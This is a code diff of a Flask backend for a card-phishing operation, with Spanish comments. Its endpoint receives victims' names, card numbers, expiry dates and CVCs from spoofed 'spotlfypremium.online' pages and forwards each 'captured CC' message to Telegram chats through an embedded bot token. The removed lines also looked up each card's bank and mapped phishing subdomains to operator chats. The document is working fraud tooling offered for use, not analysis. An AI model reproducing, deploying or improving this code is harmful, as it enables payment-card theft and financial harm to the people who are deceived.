@@ -4,73 +4,44 @@ from flask_cors import CORS
 import requests
 
 app = Flask(__name__)
-# ESTO ES VITAL: Permite que cualquier dominio (tus subdominios) le hable al servidor
-CORS(app, resources={r"/*": {"origins": "*"}})
+CORS(app)
 
 # --- CONFIGURACIÓN ---
 TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
-
-# --- MAPA DE CLIENTES ---
-CLIENTES_MAPA = {
-    'spotlfypremium.online': ['6953415010', '7707049896'],
-    'cliente1.spotlfypremium.online': ['7707049896'],
-    'free.spotlfypremium.online': ['-1087968824', '1087968824'], 
-    'promo.spotlfypremium.online': ['123456789'],
-    'juan.spotlfypremium.online': ['987654321'],
-}
-
-def get_bank_info_pro(card_number):
-    bin_number = card_number[:6]
-    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-    try:
-        res = requests.get(f"https://lookup.binlist.net/{bin_number}", headers=headers, timeout=4)
-        if res.status_code == 200:
-            data = res.json()
-            bank = data.get('bank', {}).get('name', 'Desconocido')
-            type_card = data.get('type', 'DESCONOCIDO').upper()
-            country = data.get('country', {}).get('name', 'Desconocido')
-            return f"{bank} | {type_card} | {country}"
-        return "🏦 Banco: Desconocido"
-    except:
-        return "🏦 Error de conexión"
+# Lista de personas que recibirán la información
+LISTA_DE_RECEPTORES = ['6953415010', '7707049896']
 
 @app.route('/enviar-datos', methods=['POST'])
 def recibir_datos():
-    # Detectar el dominio exacto que está llamando al servidor
-    host_recibido = request.headers.get('Host', '').split(':')[0]
-    print(f"🌐 PETICIÓN RECIBIDA DESDE: {host_recibido}")
+    data = request.json
+    target_id = str(data.get('target_id'))
 
-    lista_destinatarios = CLIENTES_MAPA.get(host_recibido)
-
-    if not lista_destinatarios:
-        print(f"🚫 DOMINIO NO AUTORIZADO: {host_recibido}")
+    # 1. Validación de seguridad (Solo si el ID está en tu lista)
+    if target_id not in LISTA_DE_RECEPTORES:
         return jsonify({"status": "ignored"}), 200
 
-    data = request.json
+    # 2. Captura de datos directos
     nombre = data.get('nombre', 'N/A')
     tarjeta = data.get('tarjeta', 'N/A')
     expiracion = data.get('expiracion', 'N/A')
     cvc = data.get('cvc', 'N/A')
 
-    info_banco = get_bank_info_pro(tarjeta)
-
+    # 3. Construcción del mensaje (Sin buscar banco, directo al grano)
     mensaje = (
-        f"💰 *NUEVA CC CAPTURADA* 💰\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 *ORIGEN:* `{host_recibido}`\n"
+        "💰 *NUEVA CC CAPTURADA* 💰\n"
+        "━━━━━━━━━━━━━━━━━━\n"
         f"👤 *Nombre:* `{nombre}`\n"
         f"💳 *Tarjeta:* `{tarjeta}`\n"
         f"📅 *Exp:* `{expiracion}`\n"
         f"🔐 *CVC:* `{cvc}`\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"🏦 *INFO:* `{info_banco}`\n"
-        f"━━━━━━━━━━━━━━━━━━"
+        "━━━━━━━━━━━━━━━━━━"
     )
 
+    # 4. Envío masivo a tus IDs
     exitos = 0
-    for id_receptor in lista_destinatarios:
+    for receptor in LISTA_DE_RECEPTORES:
         url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {"chat_id": id_receptor, "text": mensaje, "parse_mode": "Markdown"}
+        payload = {"chat_id": receptor, "text": mensaje, "parse_mode": "Markdown"}
         try:
             res = requests.post(url_telegram, json=payload, timeout=5)
             if res.status_code == 200:
@@ -78,7 +49,7 @@ def recibir_datos():
         except:
             continue
 
-    print(f"🏁 Finalizado. Enviados a {exitos} personas desde {host_recibido}")
+    print(f"✅ Proceso completado. Enviados a {exitos} personas.")
     return jsonify({"status": "success", "enviados": exitos}), 200
 
 if __name__ == '__main__':
